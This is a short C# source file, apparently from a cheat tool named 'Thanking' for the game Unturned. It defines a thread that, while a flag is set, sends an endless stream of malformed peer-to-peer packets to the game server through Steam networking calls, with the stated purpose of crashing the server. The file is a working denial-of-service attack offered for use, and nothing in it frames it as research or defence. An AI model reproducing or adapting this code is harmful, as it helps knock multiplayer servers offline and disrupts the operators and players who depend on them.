using SDG.Unturned;
using Steamworks;
using Thanking.Attributes;
using Thanking.Utilities;

namespace Thanking.Threads
{
	public static class CrashThread
	{
		public static bool CrashServerEnabled;

		[Thread]
		public static void Start()
		{
			#if DEBUG
			DebugUtilities.Log("Server Crash Thread Started");
			#endif
			
			Provider.onClientDisconnected += OnDisconnect;
			
			while (true)
				if (CrashServerEnabled)
					SteamGameServerNetworking.SendP2PPacket(Provider.server, new byte[] {255, 255, 255, 69, 69, 69, 69, 69, 69, 69, 69}, int.MaxValue, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
		}

		public static void OnDisconnect() =>
			CrashServerEnabled = false;
	}
}